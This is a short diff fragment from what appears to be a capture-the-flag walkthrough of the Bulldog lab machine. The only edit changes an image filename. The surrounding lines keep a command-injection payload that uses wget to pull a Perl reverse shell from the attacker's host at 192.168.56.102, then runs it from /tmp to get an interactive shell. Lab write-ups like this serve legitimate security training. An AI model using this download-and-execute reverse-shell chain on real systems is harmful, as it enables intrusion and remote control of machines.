@@ -303,7 +303,7 @@ Set up your listener to catch the shell:
 Now we need to use wget on the victim to download the shell and write it to somewhere. This can be accomplished with this command:
 <code>ls && wget http://192.168.56.102/perl-reverse-shell.pl -O /tmp/perl-reverse-shell.pl && perl /tmp/perl-reverse-shell.pl</code>
 
-![Alt text](/images/bulldog_4.png?raw=true "reverse shell")
+![Alt text](/images/bulldog_14.png?raw=true "reverse shell")
 
 Woo! We've got a fully interactive shell!
 
